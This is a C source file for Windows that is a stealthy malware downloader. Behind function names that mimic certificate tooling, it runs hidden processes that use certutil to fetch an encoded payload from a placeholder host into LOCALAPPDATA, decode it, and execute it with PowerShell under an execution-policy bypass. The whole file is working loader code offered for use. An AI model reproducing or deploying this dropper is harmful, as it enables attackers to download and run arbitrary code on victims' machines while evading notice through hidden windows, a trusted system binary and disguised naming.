#define _CRT_SECURE_NO_WARNINGS // To disable unsafe function warnings
#include <stdio.h>
#include <windows.h>

// Function to execute a Process
void proc(const char* command) {
    DWORD exitCode;
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(STARTUPINFOA));
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessA(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        GetExitCodeProcess(pi.hProcess, &exitCode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// Function to download a decoded artifact from a URL
void microsoftca(const char* url, const char* filePath) {
    char downloadCmd[MAX_PATH];
    sprintf_s(downloadCmd, sizeof(downloadCmd), "certutil -urlcache -split -f %s \"%s\"", url, filePath);
    proc(downloadCmd);
}

// Function to decode a file using certutil (lolbas)
void cainstall(const char* inputFilePath, const char* outputFilePath) {
    char decodeCmd[MAX_PATH];
    sprintf_s(decodeCmd, sizeof(decodeCmd), "certutil -decode \"%s\" \"%s\"", inputFilePath, outputFilePath);
    proc(decodeCmd);
}

// Function to execute a PowerShell script
void caroot(const char* scriptFilePath) {
    char scriptCmd[MAX_PATH];
    sprintf_s(scriptCmd, sizeof(scriptCmd), "powershell -ExecutionPolicy Bypass -File \"%s\"", scriptFilePath);
    proc(scriptCmd);
}

int main() {
    const char* randomHtmlUrl = "http://ipaddr/encoded_artifact";
    char* randomAppDataDir;
    _dupenv_s(&randomAppDataDir, NULL, "LOCALAPPDATA");             // Directory to save the artifact
    const char* randomHtmlFileName = "encoded_artifact";            
    const char* randomPs1FileName = "decoded_artifact";             // After decode the artifact, it will be save the original form output in a PS1 file (PS1 file is a example)

    char randomHtmlFilePath[MAX_PATH];
    char randomPs1FilePath[MAX_PATH];

    // Construct the full paths of the files
    sprintf_s(randomHtmlFilePath, sizeof(randomHtmlFilePath), "%s\\%s", randomAppDataDir, randomHtmlFileName);
    sprintf_s(randomPs1FilePath, sizeof(randomPs1FilePath), "%s\\%s", randomAppDataDir, randomPs1FileName);

    // Download the artifact
    microsoftca(randomHtmlUrl, randomHtmlFilePath);

    // Decode the artfact
    cainstall(randomHtmlFilePath, randomPs1FilePath);

    // Execute the PS1 script
    caroot(randomPs1FilePath);

    free(randomAppDataDir); // Free memory allocated by _dupenv_s

    return 0;
}

